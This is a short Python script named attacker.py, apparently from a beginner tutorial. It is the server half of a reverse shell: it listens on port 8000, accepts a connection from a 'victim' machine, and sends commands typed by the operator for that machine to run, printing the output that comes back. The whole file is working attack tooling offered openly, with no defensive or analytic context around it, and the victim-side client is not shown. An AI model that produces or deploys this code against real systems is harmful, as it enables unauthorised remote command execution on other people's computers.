# Creating attacker.py for reverse shell
# Here the attacker will be the server as it will listen for connections and accept the connections


# Importing required modules
import socket


# Getting the IP of the Attacker i.e Server to which the Victim will connect
LHOST=socket.gethostbyname(socket.gethostname())
LPORT=8000


# Creating the server
attacker=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
attacker.bind((LHOST,LPORT))


# Listening for Connections 
attacker.listen(2)
print('[*] Listening For Connections')


# Accepting the Connection Request Sent by the Client i.e the Victim
victim,addr=attacker.accept()
print('Victim Connected')


# Once the victim is connected it askes for the command
command=input('$ ')
while command.lower() != 'quit':
    try:
        encoded_command=command.encode('utf-8')

        # The encoded command is sent to the victim and the output is received 
        victim.send(encoded_command)
        shell_result=victim.recv(4096).decode('utf-8')
        print(shell_result)
        command=input('$ ')
    
    except Exception as e:
        print('Something Went Wrong')
        attacker.close()
        break

